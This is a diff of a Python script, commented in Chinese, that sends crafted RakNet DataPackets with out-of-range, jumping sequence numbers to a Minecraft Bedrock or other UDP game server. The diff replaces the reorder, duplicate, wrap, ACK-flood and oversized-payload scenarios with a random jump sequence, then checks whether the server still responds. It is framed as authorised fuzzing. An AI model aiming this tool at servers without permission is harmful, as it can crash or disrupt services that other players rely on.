@@ -1,18 +1,11 @@
 #!/usr/bin/env python3
 """
-RakNet Sequence Number Attack / Fuzzing Test Script (单包版)
+RakNet Sequence Number Attack / Fuzzing Test Script
 
 用途:
   对 RakNet 协议(常见于 Minecraft Bedrock / UDP 游戏服务端)进行 sequence number
-  鲁棒性测试,每个场景仅发送 1 个包,用于快速探测服务端处理行为。
-
-测试场景:
-  1. reorder    乱序 sequence number
-  2. duplicate  重复 sequence number
-  3. gap        巨大 sequence number gap
-  4. wrap       sequence number 回绕
-  5. ack        ACK 灌注
-  6. invalid    异常 / 非法 DataPacket
+  鲁棒性测试。发送 4 个 DataPacket,sequence number 从 1 开始随机递增跳跃,
+  最终到达 50000,用于测试服务端对 sequence number 大幅跳跃的处理能力。
 
 注意:
   - 仅用于授权的渗透测试与协议研究。
@@ -24,7 +17,6 @@ import random
 import socket
 import sys
 import time
-from typing import List
 
 
 # ---------------------------------------------------------------------------
@@ -34,13 +26,11 @@ ID_UNCONNECTED_PING = 0x01
 ID_UNCONNECTED_PONG = 0x1C
 
 ID_DATA_PACKET = 0x80       # 0x80 ~ 0x8d: DataPacket (带 sequence number)
-ID_ACK = 0xC0               # 0xc0 ~ 0xc3: ACK
 
 MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
 
 # RakNet sequence number 是 24-bit
 SEQ_MAX = 0xFFFFFF
-SEQ_MOD = 0x1000000
 
 
 # ---------------------------------------------------------------------------
@@ -57,35 +47,23 @@ def build_data_packet(seq: int, payload: bytes = b"\x00") -> bytes:
     return bytes([ID_DATA_PACKET]) + pack_seq24(seq) + payload
 
 
-def build_ack(seq_list: List[int]) -> bytes:
-    """构造 ACK 包,每条 record 为 single (3 字节 seq)。"""
-    count = min(len(seq_list), 3)
-    flags = 0xC0 | (count & 0x03)
-    body = bytearray([flags])
-    for s in seq_list[:count]:
-        body.append(0x00)          # record: single
-        body += pack_seq24(s)
-    return bytes(body)
-
-
-# ---------------------------------------------------------------------------
-# 攻击场景 (每个场景只发 1 个包)
-# ---------------------------------------------------------------------------
-SCENARIOS = {
-    "reorder":   ("乱序 sequence number",       lambda: build_data_packet(random.randint(0, SEQ_MAX))),
-    "duplicate": ("重复 sequence number (seq=0)", lambda: build_data_packet(0)),
-    "gap":       ("巨大 sequence number gap",   lambda: build_data_packet(0xFFFFF0)),
-    "wrap":      ("sequence number 回绕",       lambda: build_data_packet(0xFFFFFE)),
-    "ack":       ("ACK 灌注",                   lambda: build_ack([random.randint(0, SEQ_MAX) for _ in range(3)])),
-    "invalid":   ("异常 DataPacket (超长 payload)", lambda: build_data_packet(random.randint(0, SEQ_MAX), b"\x00" * 1024)),
-}
+def build_jump_sequence(start: int = 1, end: int = 50000, jumps: int = 4):
+    """
+    生成 jumps 个 sequence number,从 start 开始随机递增跳跃到 end。
+    中间点随机生成但保证严格递增。
+    """
+    if jumps < 2:
+        return [start]
+    # 中间跳跃点:在 (start, end) 之间随机取 jumps-2 个,排序后保证递增
+    inner = sorted(random.randint(start + 1, end - 1) for _ in range(jumps - 2))
+    return [start] + inner + [end]
 
 
 # ---------------------------------------------------------------------------
 # RakNet 客户端
 # ---------------------------------------------------------------------------
 class RakNetAttacker:
-    def __init__(self, target: str, port: int, timeout: float = 2.0):
+    def __init__(self, target: str, port: int, timeout: float = 3.0):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.sock.settimeout(timeout)
         self.addr = (target, port)
@@ -108,23 +86,22 @@ class RakNetAttacker:
         resp = self.recv_raw()
         return bool(resp) and resp[0] == ID_UNCONNECTED_PONG
 
-    def run(self, scenarios: List[str]) -> None:
+    def run(self, start: int, end: int, jumps: int) -> None:
         if self.is_online():
             print(f"[+] 目标在线: {self.addr[0]}:{self.addr[1]}")
         else:
             print(f"[!] 目标 {self.addr[0]}:{self.addr[1]} 未响应 Unconnected Ping,继续尝试...")
 
-        for s in scenarios:
-            desc, builder = SCENARIOS.get(s, (None, None))
-            if builder is None:
-                print(f"[!] 未知场景: {s}, 跳过")
-                continue
-            pkt = builder()
+        seqs = build_jump_sequence(start, end, jumps)
+        print(f"[*] 计划发送 {len(seqs)} 个包,sequence 跳跃序列: {seqs}")
+
+        for i, s in enumerate(seqs, 1):
+            pkt = build_data_packet(s)
             try:
                 self.send_raw(pkt)
-                print(f"[*] {s:10s} 已发送 1 个包 ({desc}) -> {len(pkt)} bytes")
+                print(f"    [{i}/{len(seqs)}] seq={s:>6d} 已发送 -> {len(pkt)} bytes")
             except Exception as e:
-                print(f"    [-] 场景 {s} 异常: {e}")
+                print(f"    [{i}/{len(seqs)}] seq={s} 发送异常: {e}")
 
         # 收尾:观察服务端是否仍在响应
         time.sleep(0.5)
@@ -138,37 +115,51 @@ class RakNetAttacker:
 # ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
+def parse_target(target: str):
+    """解析 'ip:端口' 格式,返回 (ip, port)。"""
+    if ":" not in target:
+        raise argparse.ArgumentTypeError("目标格式应为 <ip:端口>,例如 127.0.0.1:19132")
+    ip, _, port = target.rpartition(":")
+    try:
+        port_num = int(port)
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"端口无效: {port}")
+    if not (0 < port_num < 65536):
+        raise argparse.ArgumentTypeError(f"端口超出范围: {port_num}")
+    return ip, port_num
+
+
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        description="RakNet sequence number 攻击 / 鲁棒性测试脚本 (单包版)",
+        description="RakNet sequence number 攻击 / 鲁棒性测试脚本",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="可用场景:\n" + "\n".join(f"  {k:10s} {v[0]}" for k, v in SCENARIOS.items()),
+        epilog="示例:\n  python3 raknet_sequence_attack.py 127.0.0.1:19132\n  python3 raknet_sequence_attack.py 127.0.0.1:19132 --start 1 --end 50000 --jumps 4",
     )
-    p.add_argument("target", help="目标 IP / 主机名")
-    p.add_argument("port", type=int, help="目标 UDP 端口")
-    p.add_argument("-s", "--scenarios", nargs="+",
-                   default=list(SCENARIOS.keys()),
-                   choices=list(SCENARIOS.keys()),
-                   help="要执行的攻击场景 (默认全部)")
-    p.add_argument("-t", "--timeout", type=float, default=2.0,
-                   help="socket 接收超时秒数 (默认 2.0)")
+    p.add_argument("target", help="目标地址,格式 <ip:端口>,例如 127.0.0.1:19132")
+    p.add_argument("--start", type=int, default=1, help="起始 sequence number (默认 1)")
+    p.add_argument("--end", type=int, default=50000, help="终止 sequence number (默认 50000)")
+    p.add_argument("--jumps", type=int, default=4, help="跳跃次数 (默认 4)")
+    p.add_argument("-t", "--timeout", type=float, default=3.0,
+                   help="socket 接收超时秒数 (默认 3.0)")
     return p.parse_args()
 
 
 def main() -> int:
     args = parse_args()
+    ip, port = parse_target(args.target)
 
     print("=" * 60)
-    print(" RakNet Sequence Number Attack / Fuzzing Tool (单包版)")
+    print(" RakNet Sequence Number Attack / Fuzzing Tool")
     print("=" * 60)
-    print(f" 目标   : {args.target}:{args.port}")
-    print(f" 场景   : {', '.join(args.scenarios)}")
+    print(f" 目标     : {ip}:{port}")
+    print(f" 跳跃范围 : {args.start} -> {args.end}  ({args.jumps} 次)")
+    print(f" 超时     : {args.timeout}s")
     print("=" * 60)
     print(" ⚠ 仅用于授权的安全测试与协议研究,禁止用于非法用途。\n")
 
-    attacker = RakNetAttacker(args.target, args.port, args.timeout)
+    attacker = RakNetAttacker(ip, port, args.timeout)
     try:
-        attacker.run(args.scenarios)
+        attacker.run(args.start, args.end, args.jumps)
     except KeyboardInterrupt:
         print("\n[!] 用户中断")
     finally:
